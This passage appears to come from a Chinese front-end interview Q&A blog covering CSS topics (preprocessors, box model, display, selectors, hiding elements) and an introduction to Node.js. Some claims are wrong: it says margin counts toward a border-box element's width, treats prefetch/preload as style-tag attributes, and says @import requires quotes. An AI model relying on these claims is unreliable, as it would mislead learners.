<li><p><strong>混合（Mixins）：</strong> SCSS 中的混合允许将一组样式属性定义为可重用的函数，可以在多个地方引用。</p>
</li>
<li><p><strong>继承：</strong> SCSS 支持样式的继承，可以减少重复的样式定义。</p>
</li>
<li><p><strong>条件语句：</strong> SCSS 具有条件语句，可以根据不同条件应用不同的样式。</p>
</li>
</ol>
<h5 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h5><ol>
<li><p><strong>简洁的语法：</strong> Less 的语法相对较简单，更接近原生CSS，对于新手来说学习曲线较低。</p>
</li>
<li><p><strong>易于集成：</strong> 因为 Less 的语法更接近原生CSS，所以可以较容易地集成到现有项目中，无需太多修改。</p>
</li>
<li><p><strong>快速编译：</strong> Less 的编译速度相对较快，这对于大型项目和需要快速反馈的开发过程可能更有优势。</p>
</li>
<li><p><strong>支持 JavaScript 表达式：</strong> Less 允许在样式中使用 JavaScript 表达式，增加了样式表达能力。</p>
</li>
</ol>
<p>总体来说，选择使用 SCSS 还是 Less 取决于个人或团队的偏好以及项目的需求。SCSS 提供了更丰富的功能和更高的可维护性，适用于大型复杂项目或需要更高级样式功能的场景。Less 简单易学，适合快速开发和集成到现有项目中。无论选择哪种预处理器，它们都有助于提高样式表的可维护性和可读性。</p>
<h3 id="8、css中outline和border区别"><a href="#8、css中outline和border区别" class="headerlink" title="8、css中outline和border区别"></a>8、css中outline和border区别</h3><p><code>outline</code> 和 <code>border</code> 是 CSS 中用于绘制元素边框和轮廓的两种不同属性，它们在用途和表现上有一些重要的区别。</p>
<h5 id="border-属性："><a href="#border-属性：" class="headerlink" title="border 属性："></a><code>border</code> 属性：</h5><ul>
<li><code>border</code> 用于定义元素的边框，它是一个复合属性，包括 <code>border-width</code>（边框宽度）、<code>border-style</code>（边框样式）、<code>border-color</code>（边框颜色）这三个子属性。</li>
<li><code>border</code> 属性是在元素的内部内容框的外部绘制的，它占据了元素的布局空间。</li>
<li><code>border</code> 可以分别定义上、下、左、右四个边的边框样式、宽度和颜色。</li>
<li><code>border</code> 可以用于绘制元素的实际边框，可以设置不同的样式，如实线、虚线等，以及不同的颜色和宽度。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-number">#000</span>; <span class="hljs-comment">/* 设置2像素宽的实线边框，颜色为黑色 */</span><br></code></pre></td></tr></table></figure>

<h5 id="outline-属性："><a href="#outline-属性：" class="headerlink" title="outline 属性："></a><code>outline</code> 属性：</h5><ul>
<li><code>outline</code> 用于定义元素的轮廓，它也是一个复合属性，包括 <code>outline-width</code>（轮廓宽度）、<code>outline-style</code>（轮廓样式）、<code>outline-color</code>（轮廓颜色）这三个子属性。</li>
<li><code>outline</code> 属性不占据元素的布局空间，不影响元素的大小和位置。</li>
<li><code>outline</code> 主要用于可访问性和用户体验方面，它通常用于高亮标记具有焦点的元素（例如表单元素）或者在用户点击链接时显示虚线框。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-attribute">outline</span>: <span class="hljs-number">2px</span> dashed <span class="hljs-number">#00f</span>; <span class="hljs-comment">/* 设置2像素宽的虚线轮廓，颜色为蓝色 */</span><br></code></pre></td></tr></table></figure>

<h5 id="区别总结："><a href="#区别总结：" class="headerlink" title="区别总结："></a>区别总结：</h5><ul>
<li><code>border</code> 用于定义元素的实际边框，占据布局空间，可以设置边框样式、宽度和颜色。</li>
<li><code>outline</code> 用于定义元素的轮廓，不占据布局空间，通常用于高亮焦点元素或者为链接添加虚线框。</li>
<li><code>outline</code> 主要用于可访问性和用户体验，而 <code>border</code> 主要用于样式和布局。</li>
</ul>
<p>在使用时，根据具体的需求和效果选择使用 <code>border</code> 还是 <code>outline</code>。如果需要绘制实际边框并影响元素的布局，使用 <code>border</code>。如果只需绘制可见的轮廓用于视觉效果或可访问性，使用 <code>outline</code>。</p>
<h3 id="9、css导入页面样式用link和-import区别"><a href="#9、css导入页面样式用link和-import区别" class="headerlink" title="9、css导入页面样式用link和@import区别"></a>9、css导入页面样式用link和@import区别</h3><p>在 HTML 中导入页面样式，可以使用 <code>&lt;link&gt;</code> 元素和 <code>@import</code> CSS 规则两种不同的方法，它们之间有一些关键区别：</p>
<h5 id="lt-link-gt-元素："><a href="#lt-link-gt-元素：" class="headerlink" title="&lt;link&gt; 元素："></a><code>&lt;link&gt;</code> 元素：</h5><ol>
<li><strong>使用方法：</strong><ul>
<li><code>&lt;link&gt;</code> 是 HTML 元素，用于在 HTML 文档的 <code>&lt;head&gt;</code> 部分或外部链接的方式引入外部样式表文件。</li>
<li>它通过 <code>href</code> 属性指定要导入的 CSS 文件的路径。</li>
</ul>
</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;styles.css&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><p><strong>加载方式：</strong></p>
<ul>
<li><code>&lt;link&gt;</code> 在页面加载时会同时加载样式表，不会阻塞页面的渲染。</li>
<li>由于是在 HTML 中直接引入，浏览器会并行加载多个样式表，提高了加载效率。</li>
</ul>
</li>
<li><p><strong>优点：</strong></p>
<ul>
<li>更加灵活，可以导入多个外部样式表，同时支持媒体查询，可以根据设备特性选择不同的样式表。</li>
</ul>
</li>
</ol>
<h5 id="import-CSS-规则："><a href="#import-CSS-规则：" class="headerlink" title="@import CSS 规则："></a><code>@import</code> CSS 规则：</h5><ol>
<li><strong>使用方法：</strong><ul>
<li><code>@import</code> 是 CSS 规则，用于在 CSS 文件中引入其他样式表文件。</li>
<li>它写在 CSS 文件的顶部，用法如下：</li>
</ul>
</li>
</ol>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;styles.css&quot;</span>);<br></code></pre></td></tr></table></figure>

<ol start="2">
<li><p><strong>加载方式：</strong></p>
<ul>
<li><code>@import</code> 会在解析到它的时候才开始加载被引入的样式表，因此可能会在页面的渲染过程中造成一些阻塞，特别是在较大样式表的情况下。</li>
</ul>
</li>
<li><p><strong>限制：</strong></p>
<ul>
<li><code>@import</code> 只能用于导入 CSS 文件，不能用于导入其他文件类型（如图片或字体）。</li>
<li><code>@import</code> 的语法要求更加严格，需要使用引号包裹 URL。</li>
</ul>
</li>
</ol>
<h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><ul>
<li><code>&lt;link&gt;</code> 元素通常更加灵活，适用于大多数情况，特别是在导入多个样式表、使用媒体查询或控制样式加载顺序时。</li>
<li><code>@import</code> 规则也可以导入样式，但可能在性能方面略有劣势，应谨慎使用，特别是在大型项目中。通常更适合在小规模或特定情况下使用。</li>
<li>在大多数情况下，推荐使用 <code>&lt;link&gt;</code> 元素来导入外部样式表，以获得更好的性能和灵活性。</li>
</ul>
<h3 id="10、display几种方式以及原理"><a href="#10、display几种方式以及原理" class="headerlink" title="10、display几种方式以及原理"></a>10、display几种方式以及原理</h3><p>CSS 中的 <code>display</code> 属性用于定义元素的外部框类型，它决定了元素在文档中的显示方式。以下是常见的 <code>display</code> 属性值及其原理：</p>
<ol>
<li><p>**<code>display: block;</code>**：</p>
<ul>
<li>原理：元素生成一个块级框，占据父元素的整个宽度，垂直方向上会另起一行。</li>
<li>例子：<code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;h1&gt;</code> 等。</li>
</ul>
</li>
<li><p>**<code>display: inline;</code>**：</p>
<ul>
<li>原理：元素生成一个内联框，只占据其内容所需的宽度，不会另起一行。</li>
<li>例子：<code>&lt;span&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;strong&gt;</code> 等。</li>
</ul>
</li>
<li><p>**<code>display: inline-block;</code>**：</p>
<ul>
<li>原理：元素生成一个内联块级框，宽度由内容决定，但可以设置宽度、高度、边距等属性。</li>
<li>例子：常用于创建水平排列的块级元素，如按钮。</li>
</ul>
</li>
<li><p>**<code>display: none;</code>**：</p>
<ul>
<li>原理：元素不会在页面上显示，占据的空间会被移除，相当于元素被隐藏。</li>
<li>例子：通常用于通过 JavaScript 来控制元素的显示和隐藏。</li>
</ul>
</li>
<li><p>**<code>display: flex;</code>**：</p>
<ul>
<li>原理：元素变成一个 Flex 容器，其子元素成为 Flex 项目，可以通过设置容器和项目的属性来实现灵活的布局。</li>
<li>例子：用于创建灵活的水平或垂直布局。</li>
</ul>
</li>
<li><p>**<code>display: grid;</code>**：</p>
<ul>
<li>原理：元素变成一个 Grid 容器，可以通过设置容器和项目的属性来实现网格布局。</li>
<li>例子：用于创建复杂的网格布局。</li>
</ul>
</li>
<li><p>**<code>display: table;</code>, <code>display: table-row;</code>, <code>display: table-cell;</code>**：</p>
<ul>
<li>原理：模拟表格结构，元素表现为表格、表格行和表格单元格。</li>
<li>例子：用于实现表格布局。</li>
</ul>
</li>
<li><p>**<code>display: list-item;</code>**：</p>
<ul>
<li>原理：元素表现为列表项，通常与 <code>list-style</code> 属性一起使用。</li>
<li>例子：用于定义列表项的样式。</li>
</ul>
</li>
<li><p>**<code>display: inline-flex;</code>, <code>display: inline-grid;</code>**：</p>
<ul>
<li>原理：类似于 <code>display: flex;</code> 和 <code>display: grid;</code>，但生成的容器是内联的，而不是块级的。</li>
</ul>
</li>
<li><p>**<code>display: inherit;</code>, <code>display: initial;</code>, <code>display: unset;</code>**：</p>
<ul>
<li>这些值是用于继承、重置或取消元素的 <code>display</code> 属性。</li>
</ul>
</li>
</ol>
<p>每种 <code>display</code> 属性值都有其自身的布局特性和用途，根据项目的需求和设计目标选择合适的值是很重要的。同时，可以通过组合不同的 <code>display</code> 属性值来创建复杂的布局。例如，可以在 Flex 容器内部使用 <code>display: flex;</code> 和 <code>display: inline-block;</code> 来实现水平和垂直的灵活布局。</p>
<h3 id="11、CSS盒模型介绍一下"><a href="#11、CSS盒模型介绍一下" class="headerlink" title="11、CSS盒模型介绍一下"></a>11、CSS盒模型介绍一下</h3><p>CSS 盒模型（Box Model）是用来描述页面上的每个 HTML 元素都被视为一个矩形的模型。这个模型由四个部分组成，它们决定了元素在页面中所占的空间、大小和布局。</p>
<p>CSS 盒模型的四个部分如下：</p>
<ol>
<li><p><strong>内容区域（Content）：</strong> 这是元素内部实际包含内容的区域，例如文本、图片或其他子元素。内容区域的大小由元素的 <code>width</code> 和 <code>height</code> 属性来确定。</p>
</li>
<li><p><strong>内边距区域（Padding）：</strong> 内边距区域是内容区域周围的空间，它用于分隔内容和边框之间的距离。内边距的大小由 <code>padding</code> 属性来控制。</p>
</li>
<li><p><strong>边框区域（Border）：</strong> 边框区域是内边距区域的外部边界，用于包围元素的内容和内边距。边框的大小、样式和颜色由 <code>border</code> 属性来定义。</p>
</li>
<li><p><strong>外边距区域（Margin）：</strong> 外边距区域是边框区域的外部空间，用于分隔元素与其周围元素之间的距离。外边距的大小由 <code>margin</code> 属性来控制。</p>
</li>
</ol>
<p>在默认情况下，CSS 盒模型的宽度和高度属性（<code>width</code> 和 <code>height</code>）仅指的是内容区域的宽度和高度，而不包括内边距、边框和外边距。这意味着，如果你设置一个元素的宽度为 100px，那么元素实际占据的空间可能会大于 100px，因为内边距、边框和外边距也会占据一定的空间。</p>
<p>如果需要考虑元素的总占用空间，包括内边距、边框和外边距，可以使用 <code>box-sizing</code> 属性来改变盒模型的行为。将 <code>box-sizing</code> 设置为 <code>border-box</code> 会使宽度和高度属性包括内边距和边框，而不会额外增加元素的大小。</p>
<p>例如，以下是设置盒模型为 <code>border-box</code> 的示例：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个元素的总宽度将为 100px，包括内容、内边距、边框和外边距。 CSS 盒模型是构建 Web 页面布局的重要概念，了解它可以帮助你更好地控制和调整元素的大小和间距。</p>
<h5 id="标准盒模型和IE盒模型分别如何计算宽高"><a href="#标准盒模型和IE盒模型分别如何计算宽高" class="headerlink" title="标准盒模型和IE盒模型分别如何计算宽高"></a>标准盒模型和IE盒模型分别如何计算宽高</h5><p>标准盒模型和 IE 盒模型在计算元素的宽度和高度时有不同的方式。</p>
<p>**标准盒模型 通过 getComputedStyle 获取到的宽高是 content 的值； **</p>
<p><strong>IE盒模型 通过 getComputedStyle 获取到的宽高 &#x3D; border + padding + content</strong>，不包括外边距；</p>
<p>为了控制使用哪种盒模型，可以通过 CSS 的 <code>box-sizing</code> 属性来设置：</p>
<ul>
<li><p>若要使用标准盒模型（W3C 盒模型），可以设置：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">box-sizing</span>: content-box;<br></code></pre></td></tr></table></figure>
</li>
<li><p>若要使用 IE 盒模型（怪异盒模型），可以设置：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">box-sizing</span>: border-box;<br></code></pre></td></tr></table></figure></li>
</ul>
<p>默认情况下，大多数现代浏览器采用标准盒模型，但在某些情况下，可能需要使用 IE 盒模型以兼容特定的布局需求或遗留代码。在选择盒模型时，需要根据具体的项目和需求来决定哪种模型更合适。</p>
<h3 id="12、如何隐藏一个属性"><a href="#12、如何隐藏一个属性" class="headerlink" title="12、如何隐藏一个属性"></a>12、如何隐藏一个属性</h3><p>隐藏页面元素可以通过多种方法实现，具体取决于你的需求和使用的技术。以下是一些常见的方法：</p>
<ol>
<li><p><strong>CSS <code>display</code> 属性：</strong></p>
<ul>
<li>使用 CSS 的 <code>display</code> 属性可以隐藏元素。你可以将元素的 <code>display</code> 设置为 <code>none</code> 来完全隐藏元素，或者设置为 <code>block</code>、<code>inline</code>、<code>inline-block</code> 等值来显示或隐藏元素。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 隐藏元素 */</span><br><span class="hljs-selector-class">.hidden-element</span> &#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSS <code>visibility</code> 属性：</strong></p>
<ul>
<li>使用 CSS 的 <code>visibility</code> 属性可以隐藏元素，但元素仍占据页面空间。你可以将元素的 <code>visibility</code> 设置为 <code>hidden</code> 来隐藏元素。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 隐藏元素但保留占位 */</span><br><span class="hljs-selector-class">.hidden-element</span> &#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSS <code>opacity</code> 属性：</strong></p>
<ul>
<li>使用 CSS 的 <code>opacity</code> 属性可以将元素变为透明，但元素仍然存在。你可以将元素的 <code>opacity</code> 设置为 <code>0</code> 来隐藏元素。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 隐藏元素但保留占位 */</span><br><span class="hljs-selector-class">.hidden-element</span> &#123;<br>    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>HTML <code>hidden</code> 属性：</strong></p>
<ul>
<li>使用 HTML5 的 <code>hidden</code> 属性可以将元素隐藏，但它需要与 JavaScript 一起使用。将元素添加 <code>hidden</code> 属性将会隐藏它。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hidden-element&quot;</span> <span class="hljs-attr">hidden</span>&gt;</span>这个元素被隐藏了<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>JavaScript：</strong></p>
<ul>
<li>通过 JavaScript 编程控制元素的显示和隐藏，可以根据交互和条件来控制隐藏。以下是一个使用 JavaScript 控制隐藏的示例：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 隐藏元素</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;element-id&quot;</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;none&quot;</span>;<br><br><span class="hljs-comment">// 显示元素</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;element-id&quot;</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;block&quot;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSS <code>position</code> 属性：</strong></p>
<ul>
<li>通过设置元素的 <code>position</code> 属性为 <code>absolute</code> 或 <code>fixed</code>，然后通过设置 <code>top</code> 或 <code>left</code> 属性将元素移出视口范围，从而隐藏元素。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 隐藏元素，使其移出视口 */</span><br><span class="hljs-selector-class">.hidden-element</span> &#123;<br>    <span class="hljs-attribute">position</span>: absolute;<br>    <span class="hljs-attribute">top</span>: -<span class="hljs-number">9999px</span>;<br>    <span class="hljs-attribute">left</span>: -<span class="hljs-number">9999px</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>不同的隐藏方法适用于不同的使用场景。选择合适的方法取决于你的设计和功能需求。如果需要在用户交互中动态隐藏或显示元素，通常会使用 JavaScript 来实现。如果只是简单地静态隐藏元素，可以使用 CSS 或 HTML 属性。</p>
<h3 id="13、style标签prefetch和preload区别？"><a href="#13、style标签prefetch和preload区别？" class="headerlink" title="13、style标签prefetch和preload区别？"></a>13、style标签prefetch和preload区别？</h3><p><code>&lt;style&gt;</code>标签的prefetch和preload属性都用于优化CSS资源的加载，但它们有不同的行为和目的：</p>
<ul>
<li><code>prefetch</code>属性告诉浏览器这个CSS资源可能在未来的某个时刻需要被加载，但并不需要立即加载。浏览器会在空闲时间异步加载这个资源，以便在需要时能够立即使用。<code>prefetch</code>适用于那些当前不需要但是可能在未来会需要使用的资源。</li>
<li><code>preload</code>属性则告诉浏览器这个CSS资源在当前页面中必须被使用，因此应该立即加载和执行。浏览器会在主HTML文档下载和解析完成之前加载这个资源。<code>preload</code>适用于那些当前需要使用的资源。</li>
</ul>
<h3 id="14、css的选择器"><a href="#14、css的选择器" class="headerlink" title="14、css的选择器"></a>14、css的选择器</h3><p>CSS（层叠样式表）中的选择器用于选择要应用样式的HTML元素。CSS选择器允许你根据元素的类型、属性、关系等条件来选择一个或多个元素，从而为这些元素定义样式规则。以下是常见的CSS选择器：</p>
<ol>
<li><p><strong>元素选择器（Element Selector）：</strong> 通过HTML元素的名称来选择元素。例如，<code>p</code> 选择器将选择所有段落元素。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>类选择器（Class Selector）：</strong> 通过HTML元素的 <code>class</code> 属性来选择元素。以点 (<code>.</code>) 开头表示类选择器。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.my-class</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>ID选择器（ID Selector）：</strong> 通过HTML元素的 <code>id</code> 属性来选择元素。以井号 (<code>#</code>) 开头表示ID选择器。注意，ID应该在文档中是唯一的。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#my-id</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>通用选择器（Universal Selector）：</strong> 选择文档中的所有元素。通用选择器使用星号 (<code>*</code>) 表示。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>后代选择器（Descendant Selector）：</strong> 选择某个元素的后代元素。使用空格分隔不同层级的元素。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.parent-class</span> <span class="hljs-selector-class">.child-element</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>子元素选择器（Child Selector）：</strong> 选择某个元素的直接子元素。使用大于号 (<code>&gt;</code>) 表示。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.parent-class</span> &gt; <span class="hljs-selector-class">.direct-child</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>相邻兄弟选择器（Adjacent Sibling Selector）：</strong> 选择与另一个元素有相同父元素的相邻兄弟元素。使用加号 (<code>+</code>) 表示。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span> + <span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>通用兄弟选择器（General Sibling Selector）：</strong> 选择与另一个元素有相同父元素的所有兄弟元素。使用波浪号 (<code>~</code>) 表示。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span> ~ <span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>属性选择器（Attribute Selector）：</strong> 选择具有特定属性或属性值的元素。</p>
<ul>
<li><p>选择具有特定属性的元素：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[data-attribute]</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>选择具有特定属性值的元素：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[data-attribute=<span class="hljs-string">&quot;value&quot;</span>]</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>伪类选择器（Pseudo-class Selector）：</strong> 选择元素的特定状态或位置。伪类以冒号 (<code>:</code>) 开头。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-comment">/* 鼠标悬停状态下的样式规则 */</span><br>&#125;<br><br><span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:first</span>-child &#123;<br>  <span class="hljs-comment">/* 第一个子元素的样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>伪元素选择器（Pseudo-element Selector）：</strong> 选择元素的特定部分。伪元素以双冒号 (<code>::</code>) 开头。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::first-line</span> &#123;<br>  <span class="hljs-comment">/* 第一行的样式规则 */</span><br>&#125;<br><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>  <span class="hljs-comment">/* 元素前面插入内容的样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>这些是常见的CSS选择器，它们允许你根据不同的条件选择和定位HTML元素，以便为它们应用样式。根据项目需求，你可以组合多个选择器来更精确地选择目标元素。</p>
<h2 id="服务器相关篇"><a href="#服务器相关篇" class="headerlink" title="服务器相关篇"></a>服务器相关篇</h2><h3 id="1、介绍一下node-js"><a href="#1、介绍一下node-js" class="headerlink" title="1、介绍一下node.js"></a>1、介绍一下node.js</h3><p>Node.js 是一个基于 Chrome V8 JavaScript 引擎的运行时环境，用于构建服务器端和网络应用程序。它允许开发者使用 JavaScript 编程语言来编写服务器端代码，这在传统的前端开发中也广泛使用。以下是关于 Node.js 的一些重要信息和特点：</p>
<ol>
<li><p><strong>基于 JavaScript：</strong> Node.js 使用 JavaScript 作为主要的编程语言，这意味着前端开发者可以直接在服务器端编写代码，实现全栈开发。</p>
</li>
<li><p><strong>非阻塞和事件驱动：</strong> Node.js 的核心特点是非阻塞（non-blocking）和事件驱动（event-driven）的架构。这意味着它可以处理大量并发连接而不需要为每个连接创建新的线程，从而提高了应用程序的性能和可伸缩性。</p>
</li>
<li><p><strong>构建高性能服务器：</strong> Node.js 最初是设计用于构建高性能的网络服务器。它的事件循环机制和非阻塞 I&#x2F;O 使其非常适合处理实时、高并发的网络应用，如聊天应用、在线游戏、社交媒体等。</p>
</li>
<li><p><strong>模块化：</strong> Node.js 鼓励使用模块化编程，开发者可以轻松地创建、发布和使用模块。Node.js 自带一个模块系统，同时也有丰富的第三方模块可以使用，这些模块可以通过 npm（Node.js 包管理器）进行安装和管理。</p>
</li>
<li><p><strong>跨平台：</strong> Node.js 可以在多种操作系统上运行，包括 Windows、macOS 和各种 Linux 变体，这使得开发者可以在不同的平台上构建和部署应用程序。</p>
</li>
<li><p><strong>生态系统丰富：</strong> Node.js 拥有一个庞大而活跃的社区，开发者可以在社区中找到各种用于构建应用程序的库和框架，例如 Express.js（用于构建 Web 应用程序的框架）、Socket.io（用于实时通信的库）等。</p>
</li>
<li><p><strong>前端开发支持：</strong> Node.js 在前端开发中也非常有用，开发者可以使用它构建构建工具、任务自动化、静态文件服务器等。例如，常用的构建工具如Webpack和Babel都可以与Node.js配合使用。</p>
</li>
</ol>
<p>总的来说，Node.js 是一个强大的运行时环境，适用于构建各种类型的应用程序，从网络服务器到命令行工具，甚至是桌面应用程序。它的速度、可伸缩性和丰富的生态系统使其成为一个广泛使用的工具，特别是在构建实时和高性能的应用程序时。</p>
